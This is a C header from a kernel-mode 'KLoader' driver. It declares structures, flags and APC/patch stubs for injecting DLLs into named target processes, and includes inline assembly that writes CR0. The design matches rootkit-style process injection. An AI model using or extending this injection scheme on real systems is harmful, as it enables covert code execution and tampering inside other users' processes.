//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project
//	
// module: 
//	kloader.h
// created: 
//	february 2011
// description: 
//	Kernel-mode loader for user images. Main module.

#pragma once

#define		_DRIVER_SUPPORTS_UNLOAD		TRUE

// timer period macros
#define _RELATIVE(x)		-(x)
#define _SECONDS(x)			(LONGLONG)x*10000000
#define _MILLISECONDS(x)	(LONGLONG)x*10000
#define _MINUTES(x)			(LONGLONG)x*600000000

typedef NTSTATUS (_stdcall* FUNC_LOAD_LIBRARY)	(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle); 
typedef NTSTATUS (_stdcall* FUNC_PROC_ADDRESS)	(PVOID ModuleHandle, PANSI_STRING FunctionName, WORD Oridinal, PVOID* FunctionAddress);
typedef NTSTATUS (_stdcall* FUNC_PROTECT_MEM)	(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR* ProtectSize, ULONG NewProtect, PULONG OldProtect);	
typedef ULONG	 (_stdcall* FUNC_DLL_MAIN)		(PVOID hinstDLL, DWORD fdwReason, PVOID lpvReserved);
typedef BOOL	 (_stdcall* FUNC_CREATE_PROCESS)(PWSTR lpApplicationName, PWSTR lpCommandLine, PVOID lpProcessAttributes,
					 PVOID lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, PVOID lpEnvironment,
					 PWSTR lpCurrentDirectory, PSTARTUPINFOW lpStartupInfo, PPROCESS_INFORMATION lpProcessInformation);

typedef ULONG	(_stdcall* FUNC_APP_ENTRY) (PVOID Context);
typedef VOID	(_stdcall* FUNC_IOP_CLOSE_FILE)(PEPROCESS Process, PVOID Object, ULONG GrantedAccess, ULONG_PTR ProcessHandleCount, ULONG_PTR SystemHandleCount);


// Module description structured
typedef	struct	_INJECT_DESCRIPTOR
{
#if _DBG
	ULONG				Magic;
#endif

	LIST_ENTRY			InjectListEntry;		
	LIST_ENTRY			ProcessListEntry;

	UNICODE_STRING		TargetProcessName;
	PUNICODE_STRING		InjectModulePath;
	PVOID				InjectModuleBuffer;
	PVOID				NtdllBase;
	ULONG				Flags;
	LONG volatile		ReferenceCount;
	LONG volatile		AttachCount;
} INJECT_DESCRIPTOR, *PINJECT_DESCRIPTOR;

#define		LOADER_STUB_MAX		0x800		// bytes
#define		LOADER_PATH_MAX		0x200		// bytes

/*
typedef struct	_PROCESS_IMPORT
{
	FUNC_LOAD_LIBRARY	pLdrLoadDll;
	FUNC_PROC_ADDRESS	pLdrGetProcedureAddress;
	FUNC_PROTECT_MEM	pNtProtectVirtualMemory;
	FUNC_PROTECT_MEM	pZwProtectVirtualMemory;
	FUNC_CREATE_PROCESS	pCreateProcessW;
} PROCESS_IMPORT, *PPROCESS_IMPORT;
*/


typedef struct	_PROCESS_IMPORT
{
	ULONGLONG	pLdrLoadDll;
	ULONGLONG	pLdrGetProcedureAddress;
	ULONGLONG	pNtProtectVirtualMemory;
	ULONGLONG	pZwProtectVirtualMemory;
	ULONGLONG	pCreateProcessW;
} PROCESS_IMPORT, *PPROCESS_IMPORT;


// Loader stub context
typedef struct	_LOADER_CONTEXT
{
	PROCESS_IMPORT		Import;
	UCHAR				LoaderStub[LOADER_STUB_MAX];
	ULONG				PatchProtect;
	ULONG				Flags;
	ULONGLONG			ImageBase;
	ULONGLONG			PatchBase;
	ULONGLONG			PatchSize;
	UNICODE_STRING		uDllPath;
	WCHAR				wDllPath[0];
} LOADER_CONTEXT, *PLOADER_CONTEXT;

#define		MAX_INJECTS_PER_PROCESS		4

// Inject context
typedef	struct	_INJECT_CONTEXT
{
	PINJECT_DESCRIPTOR	InjDesc;
	PLOADER_CONTEXT		LdrCtx;
	PVOID				ApcRoutine;
	PVOID				ApcContext;
	PVOID				ModuleBase;
	ULONG				Flags;
} INJECT_CONTEXT, *PINJECT_CONTEXT;


// Active process context
typedef struct	_PID_CONTEXT
{
	ULONG				InjectCount;
	ULONG				Flags;
	INJECT_CONTEXT		InjectContext[MAX_INJECTS_PER_PROCESS];
	PROCESS_IMPORT		Import;
} PID_CONTEXT, *PPID_CONTEXT;

#define		PID_IS_LOADER				0x100000		
#define		PID_HAS_IMPORT				0x200000

// Inject descriptor flags
#define		INJECT_SPECIFIED_PROCESS	1
#define		INJECT_WOW64_PROCESS		4
#define		INJECT_AMD64_PROCESS		8
#define		INJECT_SPECIFIED_MODULE		0x10
#define		INJECT_STATE_WAITING_APC	0x100
#define		INJECT_STATE_INJECTED		0x200
#define		INJECT_KERNEL_LOADED		0x1000
#define		INJECT_WOW64_LOADED			0x2000


#define			INJECT_DESCRIPTOR_MAGIC		'DjnI'
#if _DBG
	#define		TAG_INJECT_DESCRIPTOR		INJECT_DESCRIPTOR_MAGIC
	#define		TAG_KLOADER_POOL			'rdLK'

	#define		ASSERT_INJECT_DESCRIPTOR(x)	ASSERT((x)->Magic == INJECT_DESCRIPTOR_MAGIC)
#else
	#define		TAG_INJECT_DESCRIPTOR	0
	#define		TAG_KLOADER_POOL		0

	#define		ASSERT_INJECT_DESCRIPTOR(x)
#endif

#pragma pack(push)
#pragma pack(1)
typedef struct _JMP_STUB
{
	UCHAR	PushOpcode;
	ULONG	PushValue;
	UCHAR	CallOpcode;
	ULONG	CallOffset;
} JMP_STUB, *PJMP_STUB;

typedef struct _JMP_STUB64
{
	USHORT		Opcode;
	ULONG		Offset;
	ULONG_PTR	Address;
} JMP_STUB64, *PJMP_STUB64;
#pragma pack(pop)

#define		OPCODE_JMP_NEAR		0xE9
#define		OPCODE_CALL_NEAR	0xE8
#define		OPCODE_PUSH_DWORD	0x68

#define		ATTACH_COUNT_MAX	(ULONG)-1


UCHAR	CreateProcessApcStubWow64[];
UCHAR	LoadDllApcStubWow64[];

PINJECT_DESCRIPTOR	AllocateInjectDescriptor(PSTR ProcessName, PVOID Module, ULONG AttachCount, ULONG Flags);
VOID				InsertInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc);
VOID _stdcall		LoadDllApcStub(PLOADER_CONTEXT LdrCtx,	PVOID SystemArgument1, PVOID SystemArgument2);


#pragma intrinsic(_disable)
#pragma intrinsic(_enable)

#ifndef _M_AMD64
	__inline	ULONG	__readcr0(VOID)
	{
		ULONG	Value;
		__asm
		{
			mov eax, cr0
			mov Value, eax
		}
		return(Value);
	}

	__inline	VOID	__writecr0(ULONG Value)
	{
		__asm
		{
			mov eax, Value
			mov cr0, eax
		}
	}
#endif

